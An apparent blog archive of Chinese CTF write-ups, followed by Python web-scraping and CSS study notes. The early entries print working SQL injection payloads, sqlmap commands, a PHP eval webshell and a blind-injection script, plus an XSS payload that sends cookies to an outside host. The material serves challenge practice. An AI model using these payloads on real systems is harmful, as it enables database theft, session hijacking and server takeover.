1,2%23&amp;admin_passwd=aaaa&amp;submit=GO+GO+GO 查表 admin_name=admin” union select group_concat(table_name),2 from information_schema.tables where table_schema=database() %23&amp;admin_passwd=aaaa&amp;submit=GO+GO+GO 字段名 admin_name=admin” union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name = “flag1”%23&amp;admin_passwd=aaaa&amp;submit=GO+GO+GO 数据 admin_name=admin” union select flag1, 2 from flag1%23&amp;admin_passwd=aaaa&amp;submit=GO+GO+GO 下面尝试用sqlmap先用burp抓包，保存到1.txt sqlmap.py -r 1.txt -p admin_name –dbssqlmap.py -r 1.txt -D bugkusql1 -p admin_name –tablessqlmap.py -r 1.txt -D bugkusql1 -T flag1 -p admin_name –columnssqlmap.py -r 1.txt -D bugkusql1 -T flag1 -C flag1 -p admin_name –dump 多次第一个有过滤，都在说什么异或注入，感觉其实就是|，^，这些符号代表and，or ，xor，没被过滤掉而已双写绕过，注意：information里面也有or，双写第二个union被过滤掉，双写绕不过，报错注入 查数据表http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=database()),’~’),3) %23查字段?id=1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’flag2’),’~’),3) %23查数据?id=1’ and updatexml(1,concat(‘~’,(select flag2 from flag2),’~’),3) %23 感觉是密码学的东西，先不管了 文件包含2不能读源码，不过提示有一个上传点，传一个jpg，写入一句话，貌似过滤掉了&lt;? ?&gt;&lt;?=eval($_POST[‘shell’]);&gt; 然后菜刀死活连不上，可能是服务器把菜刀ban了，自己传参数，搞定 system(“ls”)这样，也可以拿到flag flag.php按照提示，传参hint=1得到源码，反序化，字串符key为空，得到flag sql注入2全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,% 1注入大概有两种思路 异或注入过滤了substr和逗号 ^^(ascii(mid((passwd)from(1)))&gt;10)^’1’=’1跑出密码的MD5 不知道名字username=””‘admin’-(0)-‘’代入查询，字串符与数字比较得0，0=0成立则构造‘’‘import requests as rqflag=””url=’http://120.24.86.145:8007/web2/login.php&#39;cookie = { ‘PHPSESSID’:’s1hcgs1gbudti520fvski6ih1u3kn2ko’}for i in range(1,33): for j in ‘0123456789abcdef’: username=”admin’-(ascii(mid(REVERSE(MID((passwd)from(-“+str(i)+”)))from(-1)))=”+str(ord(j))+”)-‘“ data={‘uname’:username,’passwd’:’hu3sky’} r=rq.post(url=url,data=data,cookies=cookie) if “username error!!@_@” in r.text: flag=flag+j print(flag) break123456789101112131415import requests as rqflag=""url='http://120.24.86.145:8007/web2/login.php'cookie = &#123; 'PHPSESSID':'s1hcgs1gbudti520fvski6ih1u3kn2ko'&#125;for i in range(1,33): for j in '0123456789abcdef': username="admin'-(ascii(mid(REVERSE(MID((passwd)from(-"+str(i)+")))from(-1)))="+str(ord(j))+")-'" data=&#123;'uname':username,'passwd':'hu3sky'&#125; r=rq.post(url=url,data=data,cookies=cookie) if "username error!!@_@" in r.text: flag=flag+j print(flag) break 这个代码，别人写的，不明白为为什么转至那么多次，直接mid(()from(1))不行吗有时间在研究吧，不过他的代码让我知道MD5只有那几个字符，可能还可以二分查找优化一下 ##2网上都在说什么源码泄露，我也试试吧]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame_week4]]></title>
    <url>%2Fold_post%2Fhgame-week4.html</url>
    <content type="text"><![CDATA[HappyXss过滤了script img 等标签，发现input标签 1&lt;input onfocus=&apos;&apos; autofocus/&gt; 这样可以，注意过滤了双引号然后利用eval执行，16进制编码绕过过滤本来创建了一个img，访问url，但是用360浏览器本地测试过了，服务器不通过，还去问了出题人，经过学长的提示，才发现网站有csp策略，不过360浏览器貌似不会管这个东西，换了火狐发现才脚本被拦截了，default-src ‘ self ‘ 代表默认来源必须和文档同源‘unsafe-inline’ 允许使用内联资源，如内联的元素、javascript: URL、内联的事件处理函数和内联的元素。‘unsafe-eval’ 表示允许使用 eval() 等通过字符串创建代码的方法。 他指定了style的来源不受限制，应该可以通过访问这个绕过不过我在这里直接跳转，拿到flag window.location=’http://xxs.xyz/?cookies=&#39;+escape(document.cookie)]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame_week3]]></title>
    <url>%2Fold_post%2Fhgame-week3.html</url>
    <content type="text"><![CDATA[貌似丢了，写写思路吧 spli一个普通的，一个盲注，不过要加上MD5，]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame_week2]]></title>
    <url>%2Fold_post%2Fhgame-week2.html</url>
    <content type="text"><![CDATA[easy_php提示robtos.txt,然后访问 http://118.24.25.25:9999/easyphp/img/index.php文件包含，可以利用伪协议读源码，开始不知道读什么，卡住了。。。。后来发现源目录有flag.php，用工具扫扫常见文件的重要性，过滤了../双写绕过base64解密，拿到flag php trick前面大抵是一些弱类型比较，一些函数不能处理数组返回0或者null的问题，我记一些新学到吧，找不到在哪看的了，貌似是php处理参数时会把一些变量不能出现的字符转成_，然后$_SERVER[‘QUERY_STRING’]读取的是用户输入，所以.成功绕过，然后curl和parse_url关于@的解析差异，curl读取第一个@后的内容，parse_url最后一个@后的内容，开始到这里卡住了，直接用ip访问还是提示本地才行，后来改127.0.0.1返回空，后来把端口改了80才好，可是感觉没道理啊，这种vps一般不都是独立ip，因该没有把内网端口映射到外网的需要吧，难道因为用了docker后面伪协议文件读取，没什么 PHP Is The Best Language这道题还好，没卡住，gate传数组，就知道secret是null，然后key的传值就可以控制了，只要传一个加密一次和两次开头都是字母的就行，然后算出gate，拿到flag #后面两个没做出来，记记思路吧 Baby_Spider开始以为python3没requests库，用request各种难受，爬虫写好后，发现每次到第十次的样子就会出错，然后把cookies消掉，试过把之前的存下来，再去访问，或者带着cookis访问根目录，会更新cookies，但这时会出现俩个cookies，可能是requests的bug吧，虽然用哪个cookies访问question都是禁止，然后试着传token更新cookies，不禁止了，但是一直答40多次也没出flag，卡住了 Math有趣看题目要爆破的样子，然后事比较多，还要在阿大上课，写作业，周五下午才开始爆破，爆到几万的样子，没结果，新题出来了，遂放弃，可能思路有问题吧 图片的问题，地址base64加密，存在文件包含，然后读配置]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python爬虫]]></title>
    <url>%2Fold_post%2Fpython%E7%88%AC%E8%99%AB.html</url>
    <content type="text"><![CDATA[传智的pytohn爬虫笔记 信息获取静态htmlrequests 库 动态html直接从 JavaScript 代码里采集内容Selenium+PhantomJS快速入门Selenium 库里有个叫 WebDriver 的 API。WebDriver 有点儿像可以加载网站的浏览器，但是它也可以像 BeautifulSoup 或者其他 Selector 对象一样用来查找页面元素，与页面上的元素进行交互 (发送文本、点击等)，以及执行其他动作来运行网络爬虫。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# IPython2 测试代码# 导入 webdriverfrom selenium import webdriver# 要想调用键盘按键操作需要引入keys包from selenium.webdriver.common.keys import Keys# 调用环境变量指定的PhantomJS浏览器创建浏览器对象driver = webdriver.PhantomJS()# 如果没有在环境变量指定PhantomJS位置# driver = webdriver.PhantomJS(executable_path=&quot;./phantomjs&quot;))# get方法会一直等到页面被完全加载，然后才会继续程序，通常测试会在这里选择 time.sleep(2)driver.get(&quot;http://www.baidu.com/&quot;)# 获取页面名为 wrapper的id标签的文本内容data = driver.find_element_by_id(&quot;wrapper&quot;).text# 打印数据内容print data# 打印页面标题 &quot;百度一下，你就知道&quot;print driver.title# 生成当前页面快照并保存driver.save_screenshot(&quot;baidu.png&quot;)# id=&quot;kw&quot;是百度搜索输入框，输入字符串&quot;长城&quot;driver.find_element_by_id(&quot;kw&quot;).send_keys(u&quot;长城&quot;)# id=&quot;su&quot;是百度搜索按钮，click() 是模拟点击driver.find_element_by_id(&quot;su&quot;).click()# 获取新的页面快照driver.save_screenshot(&quot;长城.png&quot;)# 打印网页渲染后的源代码print driver.page_source# 获取当前页面Cookieprint driver.get_cookies()# ctrl+a 全选输入框内容driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,&apos;a&apos;)# ctrl+x 剪切输入框内容driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,&apos;x&apos;)# 输入框重新输入内容driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;itcast&quot;)# 模拟Enter回车键driver.find_element_by_id(&quot;su&quot;).send_keys(Keys.RETURN)# 清除输入框内容driver.find_element_by_id(&quot;kw&quot;).clear()# 生成新的页面快照driver.save_screenshot(&quot;itcast.png&quot;)# 获取当前urlprint driver.current_url# 关闭当前页面，如果只有一个页面，会关闭浏览器# driver.close()# 关闭浏览器driver.quit() 页面操作Selenium 的 WebDriver提供了各种方法来寻找元素，假设下面有一个表单输入框： 12 那么： 12345678# 获取id标签值element = driver.find_element_by_id(&quot;passwd-id&quot;)# 获取name标签值element = driver.find_element_by_name(&quot;user-name&quot;)# 获取标签名值element = driver.find_elements_by_tag_name(&quot;input&quot;)# 也可以通过XPath来匹配element = driver.find_element_by_xpath(&quot;//input[@id=&apos;passwd-id&apos;]&quot;) 定位UI元素 (WebElements)关于元素的选取，有如下的API 单个元素选取12345678find_element_by_idfind_elements_by_namefind_elements_by_xpathfind_elements_by_link_textfind_elements_by_partial_link_textfind_elements_by_tag_namefind_elements_by_class_namefind_elements_by_css_selector By ID 1... 实现 1234element = driver.find_element_by_id(&quot;coolestWidgetEvah&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Byelement = driver.find_element(by=By.ID, value=&quot;coolestWidgetEvah&quot;) By Class Name 1CheddarGouda 实现 1234cheeses = driver.find_elements_by_class_name(&quot;cheese&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Bycheeses = driver.find_elements(By.CLASS_NAME, &quot;cheese&quot;) By Tag Name 1 实现 1234frame = driver.find_element_by_tag_name(&quot;iframe&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Byframe = driver.find_element(By.TAG_NAME, &quot;iframe&quot;) By Name 1 实现 1234cheese = driver.find_element_by_name(&quot;cheese&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Bycheese = driver.find_element(By.NAME, &quot;cheese&quot;) By Link Text 1cheese 实现 1234cheese = driver.find_element_by_link_text(&quot;cheese&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Bycheese = driver.find_element(By.LINK_TEXT, &quot;cheese&quot;) By Partial Link Text 1search for cheese&gt; 实现 1234cheese = driver.find_element_by_partial_link_text(&quot;cheese&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Bycheese = driver.find_element(By.PARTIAL_LINK_TEXT, &quot;cheese&quot;) By CSS 1milkcheese 实现 1234cheese = driver.find_element_by_css_selector(&quot;#food span.dairy.aged&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Bycheese = driver.find_element(By.CSS_SELECTOR, &quot;#food span.dairy.aged&quot;) By XPath 1 实现 1234inputs = driver.find_elements_by_xpath(&quot;//input&quot;)------------------------ or -------------------------from selenium.webdriver.common.by import Byinputs = driver.find_elements(By.XPATH, &quot;//input&quot;) 鼠标动作链有些时候，我们需要再页面上模拟一些鼠标操作，比如双击、右击、拖拽甚至按住不动等，我们可以通过导入 ActionChains 类来做到： 示例： 12345678910111213141516171819202122232425262728#导入 ActionChains 类from selenium.webdriver import ActionChains# 鼠标移动到 ac 位置ac = driver.find_element_by_xpath(&apos;element&apos;)ActionChains(driver).move_to_element(ac).perform()# 在 ac 位置单击ac = driver.find_element_by_xpath(&quot;elementA&quot;)ActionChains(driver).move_to_element(ac).click(ac).perform()# 在 ac 位置双击ac = driver.find_element_by_xpath(&quot;elementB&quot;)ActionChains(driver).move_to_element(ac).double_click(ac).perform()# 在 ac 位置右击ac = driver.find_element_by_xpath(&quot;elementC&quot;)ActionChains(driver).move_to_element(ac).context_click(ac).perform()# 在 ac 位置左键单击hold住ac = driver.find_element_by_xpath(&apos;elementF&apos;)ActionChains(driver).move_to_element(ac).click_and_hold(ac).perform()# 将 ac1 拖拽到 ac2 位置ac1 = driver.find_element_by_xpath(&apos;elementD&apos;)ac2 = driver.find_element_by_xpath(&apos;elementE&apos;)ActionChains(driver).drag_and_drop(ac1, ac2).perform() 填充表单我们已经知道了怎样向文本框中输入文字，但是有时候我们会碰到标签的下拉框。直接点击下拉框中的选项不一定可行。 123456未审核初审通过复审通过审核不通过 Selenium专门提供了Select类来处理下拉框。 其实 WebDriver 中提供了一个叫 Select 的方法，可以帮助我们完成这些事情： 12345678910# 导入 Select 类from selenium.webdriver.support.ui import Select# 找到 name 的选项卡select = Select(driver.find_element_by_name(&apos;status&apos;))# select.select_by_index(1)select.select_by_value(&quot;0&quot;)select.select_by_visible_text(u&quot;未审核&quot;) 以上是三种选择下拉框的方式，它可以根据索引来选择，可以根据值来选择，可以根据文字来选择。注意： index 索引从 0 开始value是option标签的一个属性值，并不是显示在下拉框中的值visible_text是在option标签文本的值，是显示在下拉框的值全部取消选择怎么办呢？很简单: 1select.deselect_all() 弹窗处理当你触发了某个事件之后，页面出现了弹窗提示，处理这个提示或者获取提示信息方法如下： 1alert = driver.switch_to_alert() 页面切换一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下： 1driver.switch_to.window(&quot;this is window name&quot;) 也可以使用 window_handles 方法来获取每个窗口的操作对象。例如： 12for handle in driver.window_handles: driver.switch_to_window(handle) 页面前进和后退操作页面的前进和后退功能： 12driver.forward() #前进driver.back() # 后退 Cookies获取页面每个Cookies值，用法如下 12for cookie in driver.get_cookies(): print &quot;%s -&gt; %s&quot; % (cookie[&apos;name&apos;], cookie[&apos;value&apos;]) 删除Cookies，用法如下 12345# By namedriver.delete_cookie(&quot;CookieName&quot;)# alldriver.delete_all_cookies() 页面等待注意：这是非常重要的一部分！！ 现在的网页越来越多采用了 Ajax 技术，这样程序便不能确定何时某个元素完全加载出来了。如果实际页面等待时间过长导致某个dom元素还没出来，但是你的代码直接使用了这个WebElement，那么就会抛出NullPointer的异常。 为了避免这种元素定位困难而且会提高产生 ElementNotVisibleException 的概率。所以 Selenium 提供了两种等待方式，一种是隐式等待，一种是显式等待。 隐式等待是等待特定的时间，显式等待是指定某一条件直到这个条件成立时继续执行。 显式等待显式等待指定某个条件，然后设置最长等待时间。如果在这个时间还没有找到元素，那么便会抛出异常了。 12345678910111213141516from selenium import webdriverfrom selenium.webdriver.common.by import By# WebDriverWait 库，负责循环等待from selenium.webdriver.support.ui import WebDriverWait# expected_conditions 类，负责条件出发from selenium.webdriver.support import expected_conditions as ECdriver = webdriver.Chrome()driver.get(&quot;http://www.xxxxx.com/loading&quot;)try: # 页面一直循环，直到 id=&quot;myDynamicElement&quot; 出现 element = WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.ID, &quot;myDynamicElement&quot;)) )finally: driver.quit() 如果不写参数，程序默认会 0.5s 调用一次来查看元素是否已经生成，如果本来元素就是存在的，那么会立即返回。 下面是一些内置的等待条件，你可以直接调用这些条件，而不用自己写某些等待条件了。 1234567891011121314151617title_istitle_containspresence_of_element_locatedvisibility_of_element_locatedvisibility_ofpresence_of_all_elements_locatedtext_to_be_present_in_elementtext_to_be_present_in_element_valueframe_to_be_available_and_switch_to_itinvisibility_of_element_locatedelement_to_be_clickable – it is Displayed and Enabled.staleness_ofelement_to_be_selectedelement_located_to_be_selectedelement_selection_state_to_beelement_located_selection_state_to_bealert_is_present 隐式等待隐式等待比较简单，就是简单地设置一个等待时间，单位为秒。 123456from selenium import webdriverdriver = webdriver.Chrome()driver.implicitly_wait(10) # secondsdriver.get(&quot;http://www.xxxxx.com/loading&quot;)myDynamicElement = driver.find_element_by_id(&quot;myDynamicElement&quot;) 当然如果不设置，默认等待时间为0。 多线程等待填坑 信息提取json 如果是requests库，使用.json方法 import jsonjson模块提供了四个功能：dumps、dump、loads、load，用于字符串 和 python数据类型间进行转换。 1. json.loads()把Json格式字符串解码转换成Python对象 从json到python的类型转化对照如下： 12345678910111213# json_loads.pyimport jsonstrList = &apos;[1, 2, 3, 4]&apos;strDict = &apos;&#123;&quot;city&quot;: &quot;北京&quot;, &quot;name&quot;: &quot;大猫&quot;&#125;&apos;json.loads(strList) # [1, 2, 3, 4]json.loads(strDict) # json数据自动按Unicode存储# &#123;u&apos;city&apos;: u&apos;\u5317\u4eac&apos;, u&apos;name&apos;: u&apos;\u5927\u732b&apos;&#125; 2. json.dumps()实现python类型转化为json字符串，返回一个str对象 把一个Python对象编码转换成Json字符串 从python原始类型向json类型的转化对照如下： 1234567891011121314151617181920212223242526272829# json_dumps.pyimport jsonimport chardetlistStr = [1, 2, 3, 4]tupleStr = (1, 2, 3, 4)dictStr = &#123;&quot;city&quot;: &quot;北京&quot;, &quot;name&quot;: &quot;大猫&quot;&#125;json.dumps(listStr)# &apos;[1, 2, 3, 4]&apos;json.dumps(tupleStr)# &apos;[1, 2, 3, 4]&apos;# 注意：json.dumps() 序列化时默认使用的ascii编码# 添加参数 ensure_ascii=False 禁用ascii编码，按utf-8编码# chardet.detect()返回字典, 其中confidence是检测精确度json.dumps(dictStr) # &apos;&#123;&quot;city&quot;: &quot;\\u5317\\u4eac&quot;, &quot;name&quot;: &quot;\\u5927\\u5218&quot;&#125;&apos;chardet.detect(json.dumps(dictStr))# &#123;&apos;confidence&apos;: 1.0, &apos;encoding&apos;: &apos;ascii&apos;&#125;print json.dumps(dictStr, ensure_ascii=False) # &#123;&quot;city&quot;: &quot;北京&quot;, &quot;name&quot;: &quot;大刘&quot;&#125;chardet.detect(json.dumps(dictStr, ensure_ascii=False))# &#123;&apos;confidence&apos;: 0.99, &apos;encoding&apos;: &apos;utf-8&apos;&#125; chardet是一个非常优秀的编码识别模块，可通过pip安装 3. json.dump()将Python内置类型序列化为json对象后写入文件 123456789# json_dump.pyimport jsonlistStr = [&#123;&quot;city&quot;: &quot;北京&quot;&#125;, &#123;&quot;name&quot;: &quot;大刘&quot;&#125;]json.dump(listStr, open(&quot;listStr.json&quot;,&quot;w&quot;), ensure_ascii=False)dictStr = &#123;&quot;city&quot;: &quot;北京&quot;, &quot;name&quot;: &quot;大刘&quot;&#125;json.dump(dictStr, open(&quot;dictStr.json&quot;,&quot;w&quot;), ensure_ascii=False) 4. json.load()读取文件中json形式的字符串元素 转化成python类型 123456789101112# json_load.pyimport jsonstrList = json.load(open(&quot;listStr.json&quot;))print strList# [&#123;u&apos;city&apos;: u&apos;\u5317\u4eac&apos;&#125;, &#123;u&apos;name&apos;: u&apos;\u5927\u5218&apos;&#125;]strDict = json.load(open(&quot;dictStr.json&quot;))print strDict# &#123;u&apos;city&apos;: u&apos;\u5317\u4eac&apos;, u&apos;name&apos;: u&apos;\u5927\u5218&apos;&#125; JsonPathJsonPath 是一种信息抽取类库，是从JSON文档中抽取指定信息的工具，提供多种语言实现版本，包括：Javascript, Python， PHP 和 Java。 JsonPath 对于 JSON 来说，相当于 XPATH 对于 XML。 下载地址：https://pypi.python.org/pypi/jsonpath 安装方法：点击Download URL链接下载jsonpath，解压之后执行python setup.py install 官方文档：http://goessner.net/articles/JsonPath JsonPath与XPath语法对比：Json结构清晰，可读性高，复杂度低，非常容易匹配，下表中对应了XPath的用法。 XPath JSONPath 描述 / $ 根节点 . @ 现行节点 / .or[] 取子节点 .. n/a 取父节点，Jsonpath未支持 // .. 就是不管位置，选择所有符合条件的条件 * * 匹配所有元素节点 @ n/a 根据属性访问，Json不支持，因为Json是个Key-value递归结构，不需要。 [] [] 迭代器标示（可以在里边做简单的迭代操作，如数组下标，根据内容选值等） [,] 支持迭代器中做多选。 [] ?() 支持过滤操作. n/a () 支持表达式计算 () n/a 分组，JsonPath不支持 正则基本语法 字符集 字符集由字符组成 字符包含普通字符， . 匹配任意字符，\ 对字符进行转意 [..] 为一个字符集，里面对里面字符匹配为或对关系 \d 匹配数字,\D，\s空白字符,\S,\w单词和数字,\W,为预定义字符集，大写为取非 对意思 边界匹配 逻辑分组 （）从1开始计数，可以（P=\d）,利用别名访问，在后面访问的方法 \1 或者 (P=name) 数量词 在字符之后，*0或无数，+1或无数，？0或1，｛｝类似python数字的取法，匹配多少次 python 的使用 re模块 ompile 函数 compile 函数用于编译正则表达式，生成一个 Pattern 对象，它的一般使用形式如下： 1234import re# 将正则表达式编译成 Pattern 对象pattern = re.compile(r&apos;\d+&apos;) 在上面，我们已将一个正则表达式编译成 Pattern 对象，接下来，我们就可以利用 pattern 的一系列方法对文本进行匹配查找了。 Pattern 对象的一些常用方法主要有： match 方法：从起始位置开始查找，一次匹配match(string[, pos[, endpos]]) 没用匹配上返回NULL 当匹配成功时返回一个 Match 对象，其中： group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group))。,返回匹配字串符的其实和结束位置search 方法：从任何位置开始查找，一次匹配基本同match方法，match 只从开头匹配，search从字串符任意位置匹配，都只匹配一次，找到就返回 findall 方法：全部匹配，返回列表同上，匹配多次，返回一个列表如果没匹配到，返回空列表 finditer 方法：全部匹配，返回迭代器同finditer，返回迭代器 split 方法：分割字符串，返回列表split(string[, maxsplit]) 其中，maxsplit 用于指定最大分割次数，不指定将全部分割。看看例子： 123import rep = re.compile(r&apos;[\s\,\;]+&apos;)print p.split(&apos;a,b;; c d&apos;) 执行结果： 1[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;] sub 方法：替换看看例子： 可以在sub（r“”）传入字串符，表达式或者函数，利用分组完成想要的替换 123456789101112import rep = re.compile(r&apos;(\w+) (\w+)&apos;) # \w = [A-Za-z0-9]s = &apos;hello 123, hello 456&apos;print p.sub(r&apos;hello world&apos;, s) # 使用 &apos;hello world&apos; 替换 &apos;hello 123&apos; 和 &apos;hello 456&apos;print p.sub(r&apos;\2 \1&apos;, s) # 引用分组def func(m): return &apos;hi&apos; + &apos; &apos; + m.group(2)print p.sub(func, s)print p.sub(func, s, 1) # 最多替换一次 执行结果： 1234hello world, hello world123 hello, 456 hellohi 123, hi 456hi 123, hello 456 xpathpython下的安装和使用pip install lxml lxml是一个html/xmlh解释器，用c实现，解析时会自动补全html文档 123456789101112131415161718192021# xpath_li.pyfrom lxml import etree#利用etree.HTML，将字符串解析为HTML文档html = etree.HTML(text) # 也可以直接，读取外部文件 hello.html## html = etree.parse(&apos;./hello.html&apos;)&quot;&quot;&quot;# 按字符串序列化HTML文档，得到字串符，可以漂亮的打印出来result = etree.tostring(html，pretty_print=True) &quot;&quot;&quot;result = html.xpath(&apos;//li&apos;)print result # 打印&lt;li&gt;标签的元素集合print len(result)print type(result)print type(result[0]) xpath开发工具 开源的XPath表达式编辑工具:XMLQuire(XML格式文件可用) Chrome插件 XPath Helper 先点击插件，出现框体，可长按shift直接选择 Firefox插件 XPath Checker，新版谷歌没了 基本用法选取节点 /bookstore 选取根元素 //bookstore 忽视前面的节点，选取bookstore 元素 /bookstore/book 选取根元素下的所有book元素 //@lang 选取名为lang的所有属性，得到属性的值 *表示任何元素节点 @*表示任何属性节点 node（）表达式任何类型等节点 可以使用 | 写多个个表达式表示选取多个路径 谓语 /bookstore/book[1]，选取第一个元素 -方框内 支持last（），last（）-1，positiong（）&lt;3,等语法 //title[@lang=’eng’] ，选取 属性lang=eng等元素，eng可以不写，表示拥有这个属性 运算符可以利用运算符筛选元素详情见 W3School官方文档 beautifulSoup4beautifulSoup4官方文档 基于html dom 会载入所有html元素，效率低 安装pip install beautifulsoup4 需要安装lxml解释器 基本使用123456789101112131415161718192021222324# beautifulsoup4_test.pyfrom bs4 import BeautifulSouphtml = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;#创建 Beautiful Soup 对象soup = BeautifulSoup(html)#打开本地 HTML 文件的方式来创建对象#soup = BeautifulSoup(open(&apos;index.html&apos;))#格式化输出 soup 对象的内容print soup.prettify() 语法四大对象种类 Tag 既 html里面标签，可以不考虑目录直接使用soup.a只会返回第一个元素 有两个重要的属性 name 标签的名字 例如a attrs 将标签的属性以字典形式返回，class的值会是一个列表 ，也可以这样直接访问，soup.a[‘href’]，或者使用。get（‘href’） 方法 NavigableString 既标签里的文字 soup.p.string BeautifulSoup BeautifulSoup对象表示一个文档的内容，大部分时候，可以当做Tag， Comment 一个特殊的NavigableString，如果包含注释就会生出这个对象，输出不包含注释符soup.a.string 文档树遍历 .content 属性 soup.head.contents 可以将tag子节点以列表的方式输出 .children属性 输出一个生成器 . descendants 属性 递归循环输出所有子孙节点，生成器对象 文档树的搜索 find_all(name, attrs, recursive, text, **kwargs)name参数找所有名为name的tag，会自动忽略其他字串符 传字串符 可以传入一个正则表达式对象soup.find_all(re.compile(“^b”)) 会调用match方法匹配 传列表，里面的字符串会是或的关系 keyword 参数 传入一个字典，会匹配tag里的属性 text 参数 tag里的内容，同name的可选参数一样 如果不指定name，会只返回匹配到 的字串符，指定了返回一个标签的字串符，列表 css选择器可以利用css选择器的语法 print soup.select(‘p #link1’) 返回一个列表，可以遍历输出然后使用.get_text()返回内容 反爬虫代理ip验证码机器视觉与Tesseract 验证码识别训练]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css基础]]></title>
    <url>%2Fold_post%2Fcss%E5%9F%BA%E7%A1%80.html</url>
    <content type="text"><![CDATA[传智博客 笔记 写法选择器{属性:值;属性：值;}div{ width:100px; height:100px; color:red } 引用 外联 1&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;&gt; 嵌入 1234&lt;style type=&quot;text/css&quot;&gt; div&#123; width:100px; height:100px; color:red &#125; ......&lt;/style&gt; 内联 …… 选择器普通选择器 标签选择器 直接写标签，p,a等 id选择器 id必须唯一 #id值 类选择器 标签的class 属性 标签可以有多个类，用空格分隔 .类名字 高级选择器 后代选择器 空格表示后的，不一定是儿子 交集选择器 使用点连接，没有空格 并集选择器 使用逗号连接 通配符 * 表示所有元素 儿子选择器 使用&gt;连接 ie7开始兼容 序选择器 选择列表的的某一个元素 ul li:first-child{ ie8开始兼容 可以使用last 兄弟选择器 使用+ 选择紧挨着的下一个元素 css3选择器 待填继承和层叠 继承有一些属性给自己设置后后代会继承， color、 text-开头的、line-开头的、font-开头的。 层叠 权重计算 id的数量，类的数量，标签的数量 需要直接选中 如果相同以后面的为准 如果没有直接选中，通过继承影响则看继承的最近的 !imortant 标签 color:red !important; 写在分号内，必须有！号 只改变直接选中的情况 盒模型主要内容 width 内容的宽度 height 内容的高度 padding 内边距 padding有四个方向，上，右，左，下，顺时针 写法两种 如果写三个，左右一样 如果写两个，上下一样，左右一样 一些元素默认有，常需要清楚 border 边距 三要素 可以写一起，按照顺序 边框大小 border-width:10px; 线型 border-style:solid; 颜色 border-color:red; 按方向 - margin 外边距 标准文档流中竖直方向的margin不叠加，以较大的为准，非标准文档流无塌陷现象 盒子居住 注意，盒子居中必需有明确的width，并且是标准流的盒子，居中盒子而不是文本，居中文本要用 text-align:center; 还可通过right，left居右或者左 不要用二子的magin分离父亲，如果父亲没border，父亲也会下移，善用父亲的padding，magin描述的是兄弟间的关系 ie6的兼容问题 当出现连续浮动的元素，携带和浮动方向相同的margin时，队首的元素，会双倍margin， -解决： 使margin和浮动的方向相反 标准文档流标签的分类 块级元素 霸占一行，不与其他元素并列 能接受宽高，如果没有，默认父亲的100% 容器级标签，例如div,h,li，dt,dd还有文本级的p都为块级元素 行内元素 除p的文本级元素，a,em,i,span,b,u 不与其他元素并列 不能设置宽高，使用css设置宽高后没用，默认为文字高度 相互转换 设置display 属性 block 块级元素 inline 行内元素问题 图片或其他元素高低不同，自动底边平齐 脱离标准流 浮动 基本操作 在样式中 添加 float:right; float:left; 三个性质 浮动的元素脱离标准文档流，即在标准文档流中不认为存在浮动元素，并且不存在标准文档流的限制 浮动的元素存在互相贴的情况，如果贴下一个元素地方不够，才会贴墙，但他不会向上钻入前前一个元素的空余地方 浮动的元素 有字围效果，浮动的元素可以挡住标准六流的盒子，但是不能挡住字，文字会自动 